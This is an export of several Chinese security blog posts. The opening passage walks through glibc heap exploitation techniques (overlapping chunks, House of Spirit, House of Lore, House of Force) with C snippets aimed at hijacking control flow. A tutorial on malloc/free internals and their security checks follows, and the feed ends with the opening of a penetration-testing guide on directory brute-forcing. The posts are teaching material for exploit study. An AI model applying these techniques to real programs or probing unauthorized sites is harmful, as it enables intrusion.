<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">d = malloc(0x180-8);</div></pre></td></tr></table></figure>
<p>ok，现在我们就可以更改利用d更改c中的内容，如果c中包含某个函数指针，我们也可以去改变它.</p>
<h2 id="0×06-overlapping-chunk-2"><a href="#0×06-overlapping-chunk-2" class="headerlink" title="0×06 overlapping chunk 2"></a>0×06 overlapping chunk 2</h2><p>我们在前面先释放再修改size来获得了一个覆盖掉后面chunk 的 chunk，那么如果我们先修改size为一个大值，然后free会怎样呢？</p>
<p>首先我们创建4个chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">a = malloc(0x100-8);</div><div class="line">b = malloc(0x100-8);</div><div class="line">c = malloc(0x100-8);</div><div class="line">d = malloc(0x100-8);// 第四个为了防止被top chunk 合并，以及应对 free的检查</div></pre></td></tr></table></figure>
<p>我们通过a溢出到b的size</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*(a+0xf8) = 0x201 // 0x1为inuse标识</div></pre></td></tr></table></figure>
<p>我们这里讲b的size扩大到了c，由于free时需要检查下一个chunk的size，所以我们预留了d，并且防止free后直接与top chunk合并，之后我们free掉b，然后再次malloc就又包括了c</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">free(p);</div><div class="line">e = malloc(0x200-8);</div></pre></td></tr></table></figure>
<p>然后就可以可以像0×02一样去利用。</p>
<h2 id="0×07-House-of-spirit"><a href="#0×07-House-of-spirit" class="headerlink" title="0×07 House of spirit"></a>0×07 House of spirit</h2><p>假设我们可以在栈上伪造出一个chunk结构，那么我们可不可以利用free来释放，再次malloc得到这个chunk呢？House of spirit就是这个思路，当我们在栈上伪造出 chunk，并绕过检查的话，那么就可以实现</p>
<p>首先我们需要伪造chunk，但是要记住，在free执行的时候，会有一步检查，检查下一个chunk的size是否大于2*sizeof(size_t)，并且小于所有分配的空间，所以我们需要构造两个size位。</p>
<p>我们假设栈上有一个数组可以填充数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">unsigned long long fake_chunks[10];</div></pre></td></tr></table></figure>
<p>我们开始构造要free的chunk的size</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fake_chunks[1] = 0x40;</div></pre></td></tr></table></figure>
<p>然后为了绕过检查，需要在这个chunk后面紧跟一个chunk，设置其size位</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fake_chunks[9] = 0x1234; // 0x40/sizeof(unsigned long long) = 8</div></pre></td></tr></table></figure>
<p>然后我们把 fake_chunks[2] 的地址作为参数调用free。<font volor="#f00">堆块中，size的下一位为malloc返回的地址</font></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">free(&amp;fake_chunk[2]);// size的下一位为malloc返回的地址</div></pre></td></tr></table></figure>
<p>此时再进行malloc就可以得到该处的chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">p = malloc(0x30) // 根据 chunk size 计算公式 小于 0x38 即可 (0x38+0x10-0x08)(0x10对齐)</div></pre></td></tr></table></figure>
<h2 id="0×08-House-of-lore"><a href="#0×08-House-of-lore" class="headerlink" title="0×08 House of lore"></a>0×08 House of lore</h2><p>在前面的 House of spirit 中，我们尝试在栈上伪造了一个 chunk，那么接下来在 House of lore 中，我们将尝试伪造一条 smallbin链表，注意看，这里会用到我们在第一篇中讲过的 malloc分配流程的内容。</p>
<p>首先我们需要创建两个chunk，第一个用于进入smallbin中，第二个用来防止free后被top chunk合并</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">victim = malloc(100) // size 位于 smallbin 范围内</div><div class="line">malloc(1000) //防止free后被top chunk合并</div></pre></td></tr></table></figure>
<p>接下来我们要将这个 victim 送入 smallbin 中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">free(victim);</div></pre></td></tr></table></figure>
<p>我们先将其free掉，现在它位于unsortedbin中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">malloc(1200);</div></pre></td></tr></table></figure>
<p>接下来，我们再次申请一个size位于largebin中，并且在unsortedbin中没有与其匹配的chunk，所以我们需要一个大值。</p>
<p>设想一下，接下来会发生什么？</p>
<p>系统依次找完 fastbin、smallbin、unsortedbin后发现找不到这个size的chunk，接下来会把unsortedbin中的chunk加入到smallbin或者largebin中，这时，我们的victim就成功进入smallbin中了。</p>
<p>现在我们假设可以控制 victim的fd、bk指针，我们就可以在栈上伪造出一个smallbin的链表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">    intptr_t* stack_buffer_1[4] = &#123;0&#125;;	 // 堆1</div><div class="line">    intptr_t* stack_buffer_2[3] = &#123;0&#125;;	 // 堆2</div><div class="line">    intptr_t *victim_chunk = victim-2;   // 堆块位置</div><div class="line">    stack_buffer_1[0] = 0;</div><div class="line">    stack_buffer_1[1] = 0;</div><div class="line">    stack_buffer_1[2] = victim_chunk;</div><div class="line">    stack_buffer_1[3] = (intptr_t*)stack_buffer_2;</div><div class="line">    stack_buffer_2[2] = (intptr_t*)stack_buffer_1;</div><div class="line">    victim[1] = (intptr_t)stack_buffer_1;</div><div class="line">    </div><div class="line">    </div><div class="line">[victim]&lt;---| |-&gt;[stack_buffer_1]&lt;--| |--&gt;[stack_buffer_2]</div><div class="line">[  fd  ]	|-|--[      fd      ]   |-|---[      fd      ]</div><div class="line">[  bk  ]------|  [      bk      ]-----|   [      bk      ]</div></pre></td></tr></table></figure>
<p>那么我们再次malloc时，就可以从smallbin的链表末尾取chunk了。这里应该是stack_buffer_2</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">void *p3 = malloc(100);</div></pre></td></tr></table></figure>
<p>而当我们在栈上创造出 chunk 后，就可以向chunk中写入来覆盖返回地址控制eip，甚至绕过 canary检查。</p>
<h2 id="0×09-House-of-force"><a href="#0×09-House-of-force" class="headerlink" title="0×09 House of force"></a>0×09 House of force</h2><p>在 House of force 中，我们这样设想，如果我们能够将top chunk的size覆盖为一个巨大的值，是否就可以实现malloc从堆直接到.bss段、到栈？</p>
<p>我们首先创建一个 chunk，紧跟着这个chunk的就是top chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">p = malloc(0x100-8);</div></pre></td></tr></table></figure>
<p>我们设法溢出到top chunk</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*(p+0xf8) = -1;</div></pre></td></tr></table></figure>
<p>那么现在top chunk 的size 就是 0xffffffffffffffff，现在我们可以计算一下从top chunk的起始地址到我们要覆盖的地址之间的距离，然后malloc一个巨大的chunk填充这一段距离，然后再次malloc一个小chunk，向小chunk中写入数据就可以改变这里的值。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">malloc(big_size);</div><div class="line">q = malloc(100);</div><div class="line">*q = &quot;hello world&quot;;</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> heap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[浅析堆的申请释放及相应保护机制]]></title>
      <url>/2017/11/17/%E6%B5%85%E6%9E%90%E5%A0%86%E7%9A%84%E7%94%B3%E8%AF%B7%E9%87%8A%E6%94%BE%E5%8F%8A%E7%9B%B8%E5%BA%94%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</url>
      <content type="html"><![CDATA[<h2 id="0×00-前面的话"><a href="#0×00-前面的话" class="headerlink" title="0×00 前面的话"></a>0×00 前面的话</h2><p>在了解这部分的时候，首先你最好阅读一下这两篇博客：</p>
<p><a href="/2017/09/10/Linux堆内存管理深入分析（上）/">Linux堆内存管理深入分析（上）</a></p>
<p><a href="/2017/09/15/Linux堆内存管理深入分析（下）/">Linux堆内存管理深入分析（下）</a></p>
<p><strong>在内存中，堆是一个很有趣的地方，因为它可以由用户去直接的进行分配与销毁，所以也产生了一些很有趣、奇思妙想的漏洞，像unlink漏洞、House系列漏洞等等。但是在学习的过程中，我们很容易难以理解那些介绍的比较模糊的概念，比如 unsortedbin 在某些条件下会放回 smallbin 或 largebin 中，那到底是什么时候？也会对一些大佬构造的 payload 犯迷糊，为什么这里多了一个chunk，为什么这个字节要填充…，大佬们往往不对这些细节做过多的解释，但是这可难为了我们初学堆利用的新兵，所以，我想写几篇文章，将堆的运作机制，例如一些基本的概念，malloc机制、free机制、保护机制，和利用方法结合起来说一下，让大家能够对堆这一块有个较为清楚的认识，少走一些弯路。首先呢，我想在这篇文章中较为细致的介绍一下堆中的一些情况，剩下的有机会的话我会一并写成一个系列。</strong></p>
<p>这篇文章主要分为四个部分：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">0x01 chunk 简介</div><div class="line">0x02 bin 简介</div><div class="line">0x03 malloc 机制</div><div class="line">0x04 free 机制</div></pre></td></tr></table></figure>
<p>这些内容相对比较重要，如果看完还觉得不够的，推荐大家去读一下华庭老师的《glibc内存管理ptmalloc源代码分析》。</p>
<h2 id="0×01-chunk-简介"><a href="#0×01-chunk-简介" class="headerlink" title="0×01 chunk 简介"></a>0×01 chunk 简介</h2><p>首先先说一下堆是如何分配的，在内存中，堆（低地址到高地址，属性RW）有两种分配方式（与malloc申请chunk做区分）:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mmap: 当申请的size大于128kb时，由mmap分配。有时候是0x22000</div><div class="line">brk: 当申请的size小于128kb时，由brk分配，第一次分配132KB（main arena）,第二次在brk下分配，不够则执行系统调用，向系统申请</div></pre></td></tr></table></figure>
<p>在内存中进行堆的管理时，系统基本是以 chunk 作为基本单位，chunk的结构在源码中有定义</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">struct malloc_chunk &#123;</div><div class="line">    INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */</div><div class="line">    INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */</div><div class="line">    struct malloc_chunk* fd; /* double links -- used only if free. */</div><div class="line">    struct malloc_chunk* bk;</div><div class="line">    /* Only used for large blocks: pointer to next larger size. */</div><div class="line">    struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */</div><div class="line">    struct malloc_chunk* bk_nextsize;</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>INTERNAL_SIZE_T 即 size_t</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">#ifndef INTERNAL_SIZE_T</div><div class="line">#define INTERNAL_SIZE_T size_t</div><div class="line">#endif</div></pre></td></tr></table></figure>
<p>我们可以打印一下本机的 sizeof(size_t)，这个长度可以说是一个基准单位</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">#include&lt;stdio.h&gt;</div><div class="line">int main() &#123;</div><div class="line">    printf(&quot;sizeof(size_t) is %d\n&quot;,sizeof(size_t));</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个结构不再多谈，相关的介绍网上很多，主要提一下结构体中最后两个指针 fd_nextsize 和 bk_nextsize，这两个指针只在 largebin 中使用，其他情况下为 NULL。我们可以根据 chunk 的状态将其分为三种（allocated chunk、free chunk、top chunk）:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">allocated chunk:</div><div class="line">        chunk header:</div><div class="line">            prev_size（当上一块是free状态时，存储该chunk的size，否则被上一块chunk使用）</div><div class="line">            size（该chunk大小（包括chunk header），某位3 bits为标志位）</div><div class="line">                0bit表示上一chunk是否free</div><div class="line">                1bit表示该chunk是否由mmap分配</div><div class="line">                2bit表示该chunk是否属于main arena</div><div class="line">        data:</div><div class="line"> </div><div class="line"> </div><div class="line">free chunk:</div><div class="line">        chunk header:</div><div class="line">            prev_size:</div><div class="line">            size:</div><div class="line">        fd:指向 bin 中的next chunk</div><div class="line">        bk:指向 bin 中的last chunk（bin中先进的为last，后进的为next）</div><div class="line">        fd_nextsize:</div><div class="line">        bk_nextsize:</div><div class="line"></div><div class="line"></div><div class="line">top chunk:brk中未分配的顶端chunk</div><div class="line">        chunk header:</div><div class="line">            prev_size:</div><div class="line">            size:</div></pre></td></tr></table></figure>
<p>其中在 free chunk中有一种特殊的chunk(last remainder chunk):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">last remainder chunk:从free chunk中malloc时，如果该chunk足够大，那么将其分为两部分，未分配的放到last remainder中并交由 unsorted bin 管理。</div></pre></td></tr></table></figure>
<p>重点强调一下：这里的上一块表示在内存的堆中连续的chunk的上一块，区别bin中的前后关系。另外 chunk 的前后关系只有在bin中是使用fd、bk指针标识的，在内存中连续的chunk则通过 prev_size 和 size 来寻找前后 chunk，当然，这也就造成了漏洞。</p>
<font color="#f00">由于chunk会在几种状态之间切换，当其为free chunk时，最少需要4<em>sizeof(size_t)的空间，所以有最小分配大小。<br><br>并且由于prev_size的复用，所以实际申请的大小为 max(2sizeof(size_t)(chunk_header)-sizeof(size_t)(prev_size)+申请大小, 最小分配大小)，而且 chunk的size是按照 2sizeof(size_t)对齐的，也就是说当你申请一个不是 2</em>sizeof(size_t)整倍数的空间时， malloc 返回的 size 有会对齐，大于实际申请的空间。</font>

<p>另外提一下，当 malloc 一个chunk后，实际返回用户的地址为chunk除去chunk header后的地址，而在bin中存储的是chunk的地址，也就是说</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">p = malloc(0x40); // 假设chunk的地址为 0xdeadbeef,则返回给用户的地址是 0xdeadbeef+sizeof(chunk header)</div><div class="line">free(p)  //将p释放掉后，保存在bin中的地址为 0xdeadbeef</div></pre></td></tr></table></figure>
<h2 id="0×02-bin简介"><a href="#0×02-bin简介" class="headerlink" title="0×02 bin简介"></a>0×02 bin简介</h2><p>bin在内存中用来管理free chunk，bin为带有头结点（链表头部不是chunk）的链表数组，根据特点，将bin分为四种，分别为(fastbin、unsortedbin、smallbin、largebin):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">fastbin:</div><div class="line">    根据chunk大小维护多个单向链表</div><div class="line">    sizeof(chunk) &lt; 64(bytes)</div><div class="line">    下一chunk（内存中）的free标志位不取消，显示其仍在使用</div><div class="line">    后进先出（类似栈），后free的先被malloc</div><div class="line">    拥有维护固定大小chunk的10个链表</div><div class="line">unsortedbin:</div><div class="line">    双向循环链表</div><div class="line">    不排序</div><div class="line">    暂时存储free后的chunk，一段时间后会将chunk放入对应的bin中（详见0x02）</div><div class="line">    只有一个链表</div><div class="line">smallbin:</div><div class="line">    双向循环链表</div><div class="line">    sizeof(chunk) &lt; 512 (bytes)</div><div class="line">    先进先出（类似队列）</div><div class="line">    16,24...64,72...508 bytes(62个链表)</div><div class="line">largebin:</div><div class="line">    双向循环链表</div><div class="line">    sizeof(chunk) &gt;= 512 (bytes)</div><div class="line">    free chunk中多两个指针分别指向前后的large chunk</div><div class="line">    63个链表:0-31(512+64*i)</div><div class="line">            32-48(2496+512*i)</div><div class="line">            ...</div><div class="line">    链表中chunk大小不固定，先大后小</div></pre></td></tr></table></figure>
<p>这其中 fastbin 像是cache，用来实现快速的chunk分配，其中的chunk size大小与smallbin中的有重复（只是说大小，chunk并不重复）</p>
<p>unsortedbin 功能也是作为cache，尽量减少搜索合适chunk的时间。</p>
<p>这四个bin中，除了fastbin，其他三个都是维护双向循环链表，并且由一个长度为128 size_t的数组bins维护，bins结构如下：</p>
<table>
<thead>
<tr>
<th>NULL</th>
<th>unsortbin</th>
<th>smallbin</th>
<th>largebin</th>
<th>NULL</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>1</td>
<td>2-63</td>
<td>64-126</td>
<td>127</td>
</tr>
</tbody>
</table>
<h2 id="0×03-malloc机制"><a href="#0×03-malloc机制" class="headerlink" title="0×03 malloc机制"></a>0×03 malloc机制</h2><p>malloc功能主要由 _int_malloc() 函数实现，原型如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">static Void_t* _int_malloc(mstate av,size_t bytes)</div></pre></td></tr></table></figure>
<p>当接收到申请的内存大小后，我们看一下malloc的申请过程。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">长度位于 fastbin 时:</div><div class="line">    1.根据大小获得fastbin的index</div><div class="line">    2.根据index获取fastbin中链表的头指针</div><div class="line">        如果头指针为 NULL，转去smallbin</div><div class="line">    3.将头指针的下一个chunk地址作为链表头指针</div><div class="line">    4.分配的chunk保持inuse状态，避免被合并</div><div class="line">    5.返回除去chunk_header的地址</div><div class="line">长度位于 smallbin 时:</div><div class="line">    1.根据大小获得smallbin的index</div><div class="line">    2.根据index获取smallbin中双向循环链表的头指针</div><div class="line">    3.将链表最后一个chunk赋值给victim</div><div class="line">    4.if(victim == 表头)</div><div class="line">        链表为空，不从smallbin中分配</div><div class="line">      else if(victim == 0)</div><div class="line">        链表未初始化，将fastbin中的chunk合并</div><div class="line">      else</div><div class="line">        取出victim,设置inuse</div><div class="line">    5.检查victim是否为main_arena,设置标志位</div><div class="line">    6.返回除去chunk_header的地址</div><div class="line">长度位于 largebin 时:</div><div class="line">    1.根据大小获得largebin的index</div><div class="line">    2.将fastbin中chunk合并，加入到unsortbin中</div></pre></td></tr></table></figure>
<p>留意一点：系统实际分配的内存地址与返回的地址是不同的，返回的地址直接指向了除去 chunk header 的地址。</p>
<p>当然，我们注意到上面的分配过程并没有完成，当 smallbin 中没有 chunk 或者 smallbin 未初始化时，并没有返回分配结果，这种情况下的chunk分配将在后面与largebin的分配一起处理</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">unsortedbin:</div><div class="line">    1.反向遍历unsortedbin,检查 2*size_t&lt;chunk_size&lt;内存总分配量</div><div class="line">    2.unsortedbin的特殊分配:</div><div class="line">            如果前一步smallbin分配未完成</div><div class="line">            并且 unsortedbin中只有一个chunk</div><div class="line">            并且该chunk为 last remainder chunk</div><div class="line">            并且该chunk大小 &gt;（所需大小+最小分配大小）</div><div class="line">       则切分一块分配</div><div class="line">    3.如果请求大小正好等于当前遍历chunk的大小，则直接分配</div><div class="line">    4.继续遍历，将合适大小的chunk加入到smallbin中，向前插入作为链表的第一个chunk。(smallbin中每个链表中chunk大小相同)</div><div class="line">    5.将合适大小的chunk加入到largebin中，插入到合适的位置（largebin中每个链表chunk由大到小排列）</div><div class="line">largebin:</div><div class="line">    1.反向遍历largebin，由下到上查找，找到合适大小后切分</div><div class="line">        切分后大小&lt;最小分配大小，返回整个chunk，会略大于申请大小</div><div class="line">        切分后大小&gt;最小分配大小，加入 unsortedbin。</div><div class="line">    2.未找到，index+1，继续寻找</div></pre></td></tr></table></figure>
<p>如果这之后还未找到合适的chunk，那么就会使用top chunk进行分配,还是没有的话，如果在多线程环境中，fastbin可能会有新的chunk，再次执行合并，并向unsortedbin中重复上面，还是没有的话，就只能向系统申请了。</p>
<p>以上就是malloc分配的全经过。</p>
<p>几个malloc检查：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1.从fastbin中取出chunk后，检查size是否属于fastbin</div><div class="line">2.从smallbin中除去chunk后，检查victim-&gt;bk-&gt;fd == victim</div><div class="line">3.从unsortbin取chunk时，要检查2*size_t&lt;chunk_size&lt;内存总分配量</div><div class="line">4.从largebin取chunk时，切分后的chunk要加入unsortedbin,需要检查 unsortedbin的第一个chunk的bk是否指向unsortedbin</div></pre></td></tr></table></figure>
<h2 id="0×04-free机制"><a href="#0×04-free机制" class="headerlink" title="0×04 free机制"></a>0×04 free机制</h2><h3 id="1-首先使用-chunksize-p-宏获取p的size"><a href="#1-首先使用-chunksize-p-宏获取p的size" class="headerlink" title="1.首先使用 chunksize(p) 宏获取p的size"></a>1.首先使用 chunksize(p) 宏获取p的size</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">#define PREV_INUSE 0x1</div><div class="line">#define IS_MMAPPED 0x2</div><div class="line">#define NON_MAIN_ARENA 0x4</div><div class="line">#define SIZE_BITS (PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA)</div><div class="line">#define chunksize(p) ((p)-&gt;size &amp; ~(SIZE_BITS))</div></pre></td></tr></table></figure>
<p>也就是直接屏蔽了控制位信息，不过不要紧，chunk的分配是 2*sizeof(size_t) 对齐的，所以屏蔽低三位对大小无影响</p>
<h3 id="2-安全检查："><a href="#2-安全检查：" class="headerlink" title="2.安全检查："></a>2.安全检查：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">chunk的指针地址不能溢出</div><div class="line">chunk 的大小 &gt;= MINSIZE(最小分配大小)，并且检查地址是否对齐</div></pre></td></tr></table></figure>
<h3 id="3-大小为fastbin的情况-不改变inuse位"><a href="#3-大小为fastbin的情况-不改变inuse位" class="headerlink" title="3.大小为fastbin的情况(不改变inuse位)"></a>3.大小为fastbin的情况(不改变inuse位)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1).检查下一个chunk的size：2*size_t&lt;chunk_size&lt;内存总分配量</div><div class="line">2).double free检查：</div><div class="line">    检查当前free的chunk是否与fastbin中的第一个chunk相同，相同则报错</div></pre></td></tr></table></figure>
<p>简单的小例子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">int main() &#123;</div><div class="line">    char *a=malloc(24);</div><div class="line">    char *b=malloc(24);</div><div class="line">    free(a);</div><div class="line">    free(a);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>报错</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">int main() &#123;</div><div class="line">    char *a=malloc(24);</div><div class="line">    char *b=malloc(24);</div><div class="line">    free(a);</div><div class="line">    free(b);</div><div class="line">    free(a);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>没问题</p>
<h3 id="4-其他情况"><a href="#4-其他情况" class="headerlink" title="4.其他情况"></a>4.其他情况</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">1).检查下一个chunk的size：2*size_t&lt;chunk_size&lt;内存总分配量</div><div class="line">    如果当前 chunk 为 sbrk()分配，那么它相邻的下一块 chunk 超过了分配区的地址，会报错</div><div class="line">2).double free检查：</div><div class="line">    检查当前free的chunk是否为top chunk，是则报错</div><div class="line">    根据下一块的inuse标识检查当前free的chunk是否已被free</div><div class="line">3) unlink合并：</div><div class="line">    检查前后chunk是否free，然后向后（top chunk方向）合并，并改变对应的inuse标志位</div><div class="line">    unlink检查： I.当前chunk的size是否等于下一chunk的prev_size</div><div class="line">                II.P-&gt;bk-&gt;fd == P &amp;&amp; P-&gt;bk-&gt;fd == P</div><div class="line">    如果合并后 chunk_size &gt; 64bytes,则调用函数合并fastbin中的chunk到unsortedbin中</div><div class="line">    将合并后的chunk加入unsortedbin</div><div class="line">4) unsortedbin检查</div><div class="line">    需要检查 unsortedbin的第一个chunk的bk是否指向unsortedbin</div></pre></td></tr></table></figure>
<p>我们可以看到，针对free的检查主要是下一块的size和inuse位，另外fastbin的检查可以用来做double free。</p>
<h2 id="0×05"><a href="#0×05" class="headerlink" title="0×05"></a>0×05</h2><p>以上就是对堆的情况所做的一些介绍，了解堆的保护机制后，我们便可以在攻击时想办法进行绕过，从而构造出那些光怪陆离的payload。</p>
<p><strong>*本文原创作者：hellowuzekai，属于FreeBuf奖励计划，禁止转载</strong></p>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> heap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[渗透测试经验之谈]]></title>
      <url>/2017/11/15/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E7%BB%8F%E9%AA%8C%E4%B9%8B%E8%B0%88/</url>
      <content type="html"><![CDATA[<p><strong>1,分析目标网站内容及功能 </strong></p>
<p><strong>(1)  首先确定网站采用何种语言编写.或者是否有混用的情况.此处可以通过查看网站源文件,观察网站链接,捕获提交请求等方式获取. </strong></p>
<p><strong>(2)  爬行网站目录,使用工具对网站目录进行爬行,可以辅助上一步让结果更加精准.将爬行结果存档,如果可以,此处应分析出网站是否使用通用程序,如果是,记录下来.进行下一步. </strong></p>
<p><strong>(3)  根据上一步的爬行结果,对网站根目录或者关键目录进行暴力目录探测,如果网站为通用程序,判读是否有过二次开发,如非通用程序,在探测到的目录中寻找关键目录及文件. </strong></p>
<p><strong>此步骤详细测试方法: </strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">1.输入并访问一些不可能存在的文件或目录名,再输入并访问一些通过目录爬行已知存在的目录及文件名,从而得知服务器如何处理无效资源. </div><div class="line">2.使用网站爬行到的结果作为此步骤暴力目录探测的依据,扫描关键目录或全部. </div><div class="line">3.确定服务器如何处理文件无法找到的回应,并使用关键字技术来处理这些回应.从而判断有效资源及无效资源. </div><div class="line">4.收集此步骤暴力扫描得到的结果,并手工检测探测到目录的有效性. </div><div class="line">5.重复以上步骤,得到更多更关键的目录及文件.</div></pre></td></tr></table></figure>
<hr>
